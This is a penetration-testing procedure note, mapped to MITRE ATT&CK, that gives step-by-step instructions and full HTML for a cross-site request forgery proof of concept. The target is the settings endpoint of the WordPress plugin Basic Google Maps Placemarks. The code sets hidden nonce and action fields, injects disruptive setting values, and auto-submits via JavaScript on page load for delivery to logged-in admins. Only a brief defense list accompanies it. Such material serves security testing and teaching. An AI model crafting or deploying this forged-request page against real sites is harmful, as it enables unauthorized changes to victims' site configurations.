---
tags:
  - csrf
  - poc
  - html-exploit
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
platforms:
  - Web
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: low
detection_risk: low
sub_techniques: []
id: 6685dcad-8c7c-430d-ae6a-38bac0656ab7
created_at: '2025-12-14T17:27:22.610Z'
updated_at: '2025-12-14T17:27:22.610Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Craft CSRF Proof-of-Concept HTML Form

## Summary

This procedure details creating a malicious HTML page that forges a POST request to a vulnerable WordPress plugin settings endpoint, using captured parameters to simulate unauthorized configuration updates.

## Description

For the Basic Google Maps Placemarks plugin, the PoC mimics the admin form by including hidden inputs for essential fields like `_wpnonce`, `option_page`, and `action`, while injecting disruptive values for settings such as `bgmp_map-width`, `bgmp_map-height`, `bgmp_map-address`, `bgmp_map-zoom`, and clustering options. The form auto-submits via JavaScript when loaded, tricking the victim into executing the attack seamlessly. This is ideal for demonstrating CSRF in pentests where direct access is unavailable.

## Requirements

1. Captured nonce and form parameters from the target settings page
2. Text editor (e.g., VS Code) for HTML creation
3. Hosting capability for the malicious page (local or external server)

## Defense

Defensive measures and detection strategies:

- Enforce strict referer checks on admin endpoints
- Use Content Security Policy (CSP) to block inline scripts and external form submissions
- Monitor for unusual HTML/JS artifacts in phishing attempts

## Objectives

1. Replicate the legitimate form structure with malicious payloads
2. Ensure compatibility with the target's WordPress nonce system
3. Prepare for delivery to authenticated users

## Instructions

### Step 1: Build Basic Form Structure

**Context**: Create the HTML skeleton with form attributes matching the target endpoint.

In a text editor, write:

```html
<!DOCTYPE html>
<html>
<head><title>CSRF PoC</title></head>
<body>
<form id="csrf-form" action="http://target/wp-admin/options.php" method="POST">
<input type="hidden" name="option_page" value="bgmp_settings">
<input type="hidden" name="action" value="update">
<input type="hidden" name="_wpnonce" value="a9ef057ff9">
<!-- Malicious fields below -->
</form>
</body>
</html>
```

> Replace `target` with the actual domain and nonce with the captured value.

### Step 2: Add Malicious Parameters

**Context**: Insert fields to overwrite plugin settings with disruptive values.

Append inside the form:

```html
<input type="hidden" name="bgmp_map-width" value="testing">
<input type="hidden" name="bgmp_map-height" value="testing">
<input type="hidden" name="bgmp_map-address" value="invalid">
<input type="hidden" name="bgmp_map-zoom" value="0">
<input type="hidden" name="bgmp_map-type" value="none">
<input type="hidden" name="bgmp_clustering-enabled" value="0">
<button type="submit">Submit request</button>
<script>document.getElementById('csrf-form').submit();</script>
```

> The script enables auto-submit; remove for manual click testing.

### Step 3: Validate PoC Locally

**Context**: Test the HTML against a local WordPress instance.

Save as `csrf-poc.html`, open in a browser while logged in as admin on localhost, and confirm the POST executes without errors.

> Check the target admin panel for updated settings to verify success.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[csrf]]
- [[poc]]
- [[html-exploit]]
